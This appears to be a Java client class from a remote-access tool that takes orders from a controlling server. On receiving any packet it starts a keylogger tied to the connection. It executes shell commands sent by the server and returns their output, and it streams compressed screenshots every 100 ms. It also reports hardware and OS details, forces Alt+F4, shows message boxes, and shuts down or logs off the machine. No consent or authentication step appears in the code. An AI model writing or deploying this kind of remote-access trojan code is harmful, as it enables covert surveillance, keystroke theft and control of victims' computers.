package Client;

import Control.KeyLogger;
import Control.SendCommand;
import Hardware.*;
import Ultils.MessageType;
import Ultils.NetUtils;
import Ultils.Packet;
import com.github.kwhat.jnativehook.NativeHookException;
import org.jfree.data.time.DynamicTimeSeriesCollection;
import oshi.SystemInfo;
import oshi.hardware.CentralProcessor;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import javax.swing.*;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;

public class ClientManager {

    // Desktop
    private Thread desktop;
    private boolean runningDesktop;

    private float compression = 0.4F;

    private Thread cpuUsage;
    private boolean trackingCPU;

    public static long[] oldTicks;
    public static long[][] oldProcTicks;

    // KeyLogger
    private KeyLogger keylogger;

    public void onMessage(Packet packet, PrintWriter pw) {
        if (keylogger == null) {
            try {
                keylogger = new KeyLogger(pw);
            } catch (NativeHookException e) {
                e.printStackTrace();
            }
        }

        if (packet.action == MessageType.PERFORMANCE_TRACK.getID()) {
            System.out.println("Received from server:" + packet.data);
            try {
                if (packet.data.get(0).equals("start")) {
                    trackingCPU = true;
                    if (cpuUsage == null || !cpuUsage.isAlive()) {
                        cpuUsage = new Thread((new Runnable() {
                            @Override
                            public void run() {
                                TrackCpu(pw);
                            }
                        }));
                        cpuUsage.start();
                    }
                } else if (packet.data.get(0).equals("stop")) {
                    trackingCPU = false;
                    if (this.cpuUsage != null && this.cpuUsage.isAlive()) {
                        this.cpuUsage.stop();
                    }
                }
            } catch (Exception e) {
                System.out.println("Failed to process performance packet");
            }
            sendCpuUsage(pw);
        } else if (packet.action == MessageType.STORAGE_TRACK.getID()) {
            System.out.println("Storage Track");
        } else if (packet.action == MessageType.HARDWARE_INFO.getID()) {
            System.out.println("Received request Hardware info");
            SendCpuInfo(pw);
            SendDiskInfo(pw);
            SendDisplayInfo(pw);
            SendGPUInfo(pw);
            SendOSInfo(pw);
            SendRAMInfo(pw);
        } else if (packet.action == MessageType.ALTF4.getID()) {
            try {
                Robot r = new Robot();
                r.keyPress(KeyEvent.VK_ALT);
                r.keyPress(KeyEvent.VK_F4);

                r.keyRelease(KeyEvent.VK_ALT);
                r.keyRelease(KeyEvent.VK_F4);
            } catch (AWTException e) {
                e.printStackTrace();
            }
        }  else if (packet.action == MessageType.MESSAGE_BOX.getID()) {
            try {
                new Thread(new Runnable() {

                    @Override
                    public void run() {
                        try {
                            JOptionPane.showMessageDialog(null, packet.data.get(1), packet.data.get(0), Integer.parseInt(packet.data.get(2)));
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                }).start();
            } catch (Exception npe) {
                npe.printStackTrace();
            }
        } else if (packet.action == MessageType.COMMAND.getID()) {
            try {
                System.out.println(packet.data);
                String result = Control.SendCommand.SendCommand(packet.data.get(1));
                Packet commandPacket = new Packet();
                commandPacket.action = MessageType.COMMAND.getID();
                commandPacket.data = new ArrayList<String>();
                commandPacket.data.add("return");
                commandPacket.data.add(result);
                commandPacket.data.add("eof");
                NetUtils.sendMessage(commandPacket, pw);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (packet.action == MessageType.DESKTOP.getID()) {
            try {
                if (packet.data.get(0).equals("start")) {
                    runningDesktop = true;
                    if (desktop == null || !desktop.isAlive()) {
                        desktop = new Thread(new Runnable() {

                            @Override
                            public void run() {
                                remoteDesktop(pw);
                            }
                        });
                        desktop.start();
                    }
                } else if (packet.data.get(0).equals("stop")) {
                    runningDesktop = false;
                    if (this.desktop != null && this.desktop.isAlive()) {
                        this.desktop.stop();
                    }
                } else if (packet.data.get(0).equals("comp")) {
                    this.compression = Float.parseFloat(packet.data.get(1));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (packet.action == MessageType.SHUTDOWN.getID()) {
            SendCommand.SendCommand_ShutDown();
            System.out.println("Client shutting down");
        } else if (packet.action == MessageType.LOGOFF.getID()) {
            SendCommand.SenCommand_LogOff();
            System.out.println("Client logging off");
        }
    }
    private void TrackCpu(PrintWriter pw) {
        while (trackingCPU) {
            try {
                sendCpuUsage(pw);
            } catch (ThreadDeath tde) {
                System.out.println("Stopped tracking");
            }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException ie) {
                System.out.println("Tracking sleep stopped");
            } catch (ThreadDeath tde) {
                System.out.println("Thread dead while tracking");
            }
        }
    }

    private static void sendCpuUsage(PrintWriter pw)
    {
        SystemInfo si = new SystemInfo();
        CentralProcessor processor = si.getHardware().getProcessor();
        Hardware.CPU_Usage cpu_usage = new CPU_Usage(si);
        try {
            Packet packet = new Packet();
            packet.action = MessageType.PERFORMANCE_TRACK.getID();

            double cpuData = cpu_usage.cpuData(processor,oldTicks);
            double[] procData = cpu_usage.procData(processor,oldProcTicks);

            packet.data = new ArrayList<>();

            for (int i = 0; i < procData.length; ++i)
            {
                packet.data.add(String.valueOf(procData[i] * 100));
            }

            packet.data.add(String.valueOf(cpuData * 100));

            NetUtils.sendMessage(packet,pw);
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    private void downloadUsingStream(String urlStr, File file) throws IOException {
        URL url = new URL(urlStr);
        BufferedInputStream bis = new BufferedInputStream(url.openStream());
        FileOutputStream fis = new FileOutputStream(file);
        byte[] buffer = new byte[1024];
        int count=0;
        while((count = bis.read(buffer,0,1024)) != -1) {
            fis.write(buffer, 0, count);
        }
        fis.close();
        bis.close();
    }

    private void remoteDesktop(PrintWriter pw) {
        File temp = new File(System.getProperty("java.io.tmpdir"), "tempd.jpg");
        while (runningDesktop) {
            try {
                Dimension tk = Toolkit.getDefaultToolkit().getScreenSize();

                Robot rt = new Robot();
                BufferedImage img = rt.createScreenCapture(new Rectangle((int) tk.getWidth(), (int) tk.getHeight()));

                ImageWriter writer =  ImageIO.getImageWritersByFormatName("jpg").next();
                ImageOutputStream ios = ImageIO.createImageOutputStream(new FileOutputStream(temp));
                writer.setOutput(ios);

                ImageWriteParam param = writer.getDefaultWriteParam();
                if (param.canWriteCompressed()){
                    param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
                    param.setCompressionQuality(compression);
                }
                writer.write(null, new IIOImage(img, null, null), param);
                String encodedString = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get(temp.getPath())));
                Packet packet = new Packet();
                packet.action = MessageType.DESKTOP.getID();
                packet.data = new ArrayList<String>();
                packet.data.add(encodedString);
                NetUtils.sendMessage(packet, pw);
            } catch (ThreadDeath dt) {
                if (temp.exists()) {
                    try {
                        temp.delete();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }

            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                System.out.println("Sleep interrupted while recording");
            } catch (ThreadDeath dt) {}
        }
        if (temp.exists()) {
            try {
                temp.delete();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public void SendCpuInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("cpu");
        packet.data.add(CPU.getCpuInformation());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending cpu info " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send CPU info");
        }
    }

    public void SendGPUInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("gpu");
        packet.data.add(GPU.getGPUInformation().toString());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending gpu info " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send GPU info");
        }
    }

    public void SendDiskInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("disk");
        packet.data.add(Disk.GetDiskInfo());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending disk info " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send disk info");
        }
    }

    public void SendDisplayInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("display");
        packet.data.add(DisplayInfo.GetAllDisplayInformation());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending display info " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send display info");
        }
    }

    public void SendOSInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("os");
        packet.data.add(OS.GetOSVersionInfo());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending os info: " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send OS info");
        }
    }

    public void SendRAMInfo(PrintWriter pw) {
        Packet packet = new Packet();
        packet.action = MessageType.HARDWARE_INFO.getID();
        packet.data = new ArrayList<>();
        packet.data.add("ram");
        packet.data.add(RAM.GetPhysicalMemory());
        try {
            NetUtils.sendMessage(packet, pw);
            System.out.println("Sending ram info: " + packet.data);
        } catch (Exception e) {
            System.out.println("Failed to send RAM info");
        }
    }

    public String getSeparator() {
        return "|}";
    }
}
